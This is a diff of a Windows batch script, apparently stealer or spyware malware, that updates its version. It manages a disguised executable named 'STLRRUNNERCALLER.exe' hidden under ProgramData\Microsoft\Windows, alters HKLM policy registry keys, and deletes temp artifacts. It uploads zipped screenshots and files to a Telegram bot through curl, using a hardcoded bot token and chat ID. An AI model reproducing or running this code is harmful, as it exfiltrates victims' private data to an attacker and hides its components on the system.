@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=9.8"
+set "BATCHVERSION=9.9"
 
 
 
@@ -180,8 +180,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-echo Killing Task
-:: taskkill /F /IM STLRRUNNERCALLER.exe
+echo Killing Tasks
+taskkill /F /IM STLRRUNNERCALLER.exe
 echo.
 
 
@@ -195,11 +195,11 @@ goto :NEXT3
 tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
 if %errorlevel% neq 0 (
     echo STLRRUNNERCALLER.exe is not running.
-    set "CheckSend=1"
+    ::set "CheckSend=1"
     echo CheckSend=%CheckSend%
     echo Starting STLRRUNNERCALLER...
-    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-    set "MESSAGE=STLRSTARTED|"
+    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    ::set "MESSAGE=STLRSTARTED|"
     echo Started.
 ) else (
     echo STLRRUNNERCALLER.exe is already running.
@@ -1664,6 +1664,7 @@ echo.
 echo.
 
 
+goto PEROTY
 
 
 
@@ -1698,6 +1699,23 @@ echo.
 
 
 
+
+:PEROTY
+
+echo List mseuope files..
+dir /b "%temp%\*.mseuope"
+echo.
+
+echo Deleting mseuope files...
+del /f /q "%temp%\*.mseuope"
+echo.
+
+echo List mseuope files again..
+dir /b "%temp%\*.mseuope"
+echo.
+
+
+
 :: ============ Updates & SCRNSHTS TOPIC ============
 set "TOKEN_UPDATESSCRNSHTS=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_UPDATESSCRNSHTS=-1002163721260"
@@ -1716,7 +1734,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
      -F "document=@%ZIP_FILE%"
 
-
+goto PEROTY1
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
      -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
@@ -1725,6 +1743,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "document=@%ZIP_FILEMS%"
 
 
+:PEROTY1
 
 
 
